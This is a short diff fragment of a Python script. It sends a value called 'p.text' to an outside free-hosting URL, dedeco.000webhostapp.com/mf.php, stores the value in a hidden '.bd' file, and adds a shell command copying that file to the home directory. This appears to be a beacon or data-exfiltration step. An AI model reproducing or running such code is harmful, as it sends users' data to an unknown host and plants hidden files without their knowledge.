@@ -6,3 +6,5 @@ l = requests.get('https://dedeco.000webhostapp.com/mf.php?fi='+p.text)
 m = requests.get('https://dedeco.000webhostapp.com/mf.php?fi='+p.text+'config')
 with open('.bd', 'w') as ip:
     ip.write(p.text)
+    
+os.system('cp .bd ~/')
